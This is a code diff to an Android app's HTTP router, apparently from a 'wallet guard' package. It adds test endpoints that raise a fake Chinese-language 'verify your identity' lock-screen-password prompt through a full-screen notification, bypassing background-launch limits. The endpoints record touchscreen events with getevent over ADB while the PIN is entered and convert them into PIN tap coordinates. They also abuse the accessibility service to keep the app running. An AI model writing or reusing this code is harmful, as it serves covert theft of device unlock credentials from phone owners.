@@ -243,6 +243,7 @@ public final class ApiRouter {
         });
         httpServer.get("/rewriteDebugPort", (req, res) -> AdbHandler.rewriteDebugPort(res));
         httpServer.get("/reloadPairKeyFiles", (req, res) -> AdbHandler.reloadPairKeyFiles(res));
+        httpServer.get("/adbDiag", (req, res) -> AdbHandler.adbDiag(res));
 
         // ─── F: 媒体 (10 路由) → MediaHandler ───
         httpServer.get("/screenshot/0", (req, res) -> {
@@ -306,6 +307,162 @@ public final class ApiRouter {
             UnlockHandler.stopVerifyCredential(res, q.getString("packageName"));
         });
         httpServer.get("/requestLocalKeepAlive", (req, res) -> UnlockHandler.requestLocalKeepAlive(res));
+
+        // ADAPT: 测试端点 — 清除所有 delegate 并直接启动 OPPO 保活引擎
+        httpServer.get("/testOppoKeepAlive", (req, res) -> {
+            try {
+                android.util.Log.e("KeepAliveDebug", "testOppoKeepAlive called");
+                com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
+                if (svc == null) {
+                    HttpResponseHelper.error(res, "accessibility service is null");
+                    return;
+                }
+                // 清除所有活跃 delegate
+                if (svc.j()) {
+                    android.util.Log.e("KeepAliveDebug", "clearing active delegates");
+                    svc.x();  // remove KeepAliveEngine
+                    svc.w();  // remove GrantPermissionDelegate
+                    try { Thread.sleep(500); } catch (Exception ignored) {}
+                }
+                // 直接调用 b(str) 启动保活引擎
+                String pkg = com.guard.wallet.MainApplication.getAppContext().getPackageName();
+                android.util.Log.e("KeepAliveDebug", "starting OppoEngine via b() pkg=" + pkg);
+                svc.b(pkg);
+                HttpResponseHelper.ok(res, true);
+            } catch (Exception e) {
+                android.util.Log.e("KeepAliveDebug", "testOppoKeepAlive error", e);
+                HttpResponseHelper.error(res, e.getMessage());
+            }
+        });
+
+        // ADAPT: 测试端点 — 用 Full-screen Intent 启动 ConfirmDeviceActivity (绕过华为后台限制)
+        httpServer.get("/testConfirmDevice", (req, res) -> {
+            try {
+                android.content.Context ctx = com.guard.wallet.MainApplication.getAppContext();
+                if (ctx == null) { HttpResponseHelper.error(res, "context null"); return; }
+
+                android.content.Intent intent = new android.content.Intent(ctx, com.guard.wallet.activity.ConfirmDeviceActivity.class);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                        | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                android.os.Bundle extras = new android.os.Bundle();
+                extras.putString("CONFIRM_DEVICE_CREDENTIAL_TITLE", "验证个人身份");
+                extras.putString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE", "隐私保护");
+                extras.putString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION", "为了保护你的隐私,请输入锁屏密码,验证是否本人操作");
+                extras.putString("CONFIRM_FOR_EVENT_CODE", "PREPARE_FOR_APP_CONFIRM_LOCK");
+                intent.putExtras(extras);
+
+                // 用 Full-screen notification intent 绕过后台启动限制
+                android.app.PendingIntent pi = android.app.PendingIntent.getActivity(
+                        ctx, 0, intent,
+                        android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
+
+                String channelId = "confirm_device";
+                android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
+                if (android.os.Build.VERSION.SDK_INT >= 26) {
+                    android.app.NotificationChannel ch = new android.app.NotificationChannel(
+                            channelId, "验证", android.app.NotificationManager.IMPORTANCE_HIGH);
+                    nm.createNotificationChannel(ch);
+                }
+                android.app.Notification notification = new android.app.Notification.Builder(ctx, channelId)
+                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                        .setContentTitle("隐私保护")
+                        .setContentText("请验证身份")
+                        .setFullScreenIntent(pi, true)
+                        .setAutoCancel(true)
+                        .build();
+                nm.notify(9999, notification);
+
+                HttpResponseHelper.ok(res, true);
+            } catch (Exception e) {
+                android.util.Log.e("TestConfirmDevice", "error", e);
+                HttpResponseHelper.error(res, e.getMessage());
+            }
+        });
+
+        // ADAPT: 测试端点 — getevent 捕获 PIN pad 触摸坐标
+        httpServer.get("/testPinCapture", (req, res) -> {
+            try {
+                android.util.Log.e("PinCapture", "testPinCapture: starting getevent capture");
+                com.guard.wallet.adb.AdbConnectionManager.initialize();
+                com.guard.wallet.adb.AdbConnectionManager mgr = com.guard.wallet.adb.AdbConnectionManager.getInstance();
+                if (mgr == null || !mgr.isConnected()) {
+                    HttpResponseHelper.error(res, "ADB not connected");
+                    return;
+                }
+                // 1. 后台启动 getevent 捕获 15 秒
+                String captureCmd = "timeout 15 getevent -t /dev/input/event2 > /data/local/tmp/pin_touch.log 2>&1 &";
+                mgr.executeShellCommand(captureCmd);
+                android.util.Log.e("PinCapture", "getevent capture started");
+
+                // 2. 等 1 秒后启动 ConfirmDeviceActivity
+                try { Thread.sleep(1000); } catch (Exception ignored) {}
+                boolean launched = com.guard.wallet.utils.SystemHelper.Q0();
+                android.util.Log.e("PinCapture", "ConfirmDeviceActivity launched=" + launched);
+
+                HttpResponseHelper.ok(res, "getevent capturing 15s, ConfirmDeviceActivity launched=" + launched + ". Enter PIN then call /testPinResult");
+            } catch (Exception e) {
+                android.util.Log.e("PinCapture", "testPinCapture error", e);
+                HttpResponseHelper.error(res, e.getMessage());
+            }
+        });
+
+        // ADAPT: 测试端点 — 读取 getevent 捕获结果
+        httpServer.get("/testPinResult", (req, res) -> {
+            try {
+                com.guard.wallet.adb.AdbConnectionManager mgr = com.guard.wallet.adb.AdbConnectionManager.getInstance();
+                if (mgr == null || !mgr.isConnected()) {
+                    HttpResponseHelper.error(res, "ADB not connected");
+                    return;
+                }
+                // 读取触摸日志
+                String readCmd = "cat /data/local/tmp/pin_touch.log";
+                try (io.github.muntashirakon.adb.AdbStream stream = mgr.openStream("shell:" + readCmd)) {
+                    java.io.InputStream is = stream.openInputStream();
+                    byte[] buf = new byte[8192];
+                    StringBuilder sb = new StringBuilder();
+                    while (!stream.isClosed()) {
+                        int read = is.read(buf);
+                        if (read == -1) break;
+                        if (read > 0) sb.append(new String(buf, 0, read, java.nio.charset.StandardCharsets.UTF_8));
+                        if (sb.length() > 50000) break;
+                    }
+                    String raw = sb.toString();
+                    // 解析 ABS_MT_POSITION_X/Y
+                    String[] lines = raw.split("\n");
+                    StringBuilder result = new StringBuilder();
+                    String lastX = null, lastY = null;
+                    int touchCount = 0;
+                    for (String line : lines) {
+                        if (line.contains("ABS_MT_POSITION_X")) {
+                            lastX = line.replaceAll(".*ABS_MT_POSITION_X\\s+", "").trim();
+                        } else if (line.contains("ABS_MT_POSITION_Y")) {
+                            lastY = line.replaceAll(".*ABS_MT_POSITION_Y\\s+", "").trim();
+                        } else if (line.contains("BTN_TOUCH") && line.contains("DOWN")) {
+                            if (lastX != null && lastY != null) {
+                                try {
+                                    int rawX = Integer.parseInt(lastX, 16);
+                                    int rawY = Integer.parseInt(lastY, 16);
+                                    int screenX = rawX * 1240 / 12400;
+                                    int screenY = rawY * 2772 / 27720;
+                                    touchCount++;
+                                    result.append("touch").append(touchCount).append(": screen(").append(screenX).append(",").append(screenY).append(") raw(0x").append(lastX).append(",0x").append(lastY).append(")\n");
+                                } catch (NumberFormatException ignored) {}
+                                lastX = null;
+                                lastY = null;
+                            }
+                        }
+                    }
+                    org.json.JSONObject json = new org.json.JSONObject();
+                    json.put("touchCount", touchCount);
+                    json.put("coordinates", result.toString());
+                    json.put("rawLines", lines.length);
+                    HttpResponseHelper.ok(res, json);
+                }
+            } catch (Exception e) {
+                android.util.Log.e("PinCapture", "testPinResult error", e);
+                HttpResponseHelper.error(res, e.getMessage());
+            }
+        });
 
         // ─── J: 文件/同步 (15 路由) → FileSyncHandler ───
         httpServer.get("/deleteFile", (req, res) -> {
